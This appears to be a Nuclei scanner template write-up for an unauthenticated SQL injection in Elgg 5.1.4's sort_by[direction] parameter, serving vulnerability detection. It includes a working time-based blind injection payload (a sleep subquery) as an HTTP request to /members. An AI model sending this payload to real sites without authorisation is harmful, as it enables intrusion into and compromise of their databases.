# Nuclei Template: Elgg 5.1.4 - SQL Injection
**Template ID:** elgg-sqli
**Vulnerability Class:** SQL Injection
**Severity:** High
**CWE:** CWE-89
**Source:** Nuclei Template (`elgg-sqli.yaml`)

## Vulnerability Information & PoC

## Description
Elgg 5.1.4 version has a SQL Injection vulnerability in the sort_by[direction] parameter. This vulnerability allows an unauthenticated attacker to manipulate SQL queries by injecting malicious SQL code, potentially leading to unauthorized data access or database compromise. No user authentication is required to exploit this vulnerability.

## Steps to reproduce / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

@timeout 20s
GET /members?sort_by%5Bproperty%5D=name&sort_by%5Bproperty_type%5D=metadata&sort_by%5Bdirection%5D=desc%2c(select*from(select(sleep(6)))a) HTTP/1.1
Host: {{Hostname}}
```

## References
- https://github.com/4rdr/proofs/blob/main/info/Elgg_unauth_SQLi_5.1.4.md
- https://github.com/Elgg/Elgg
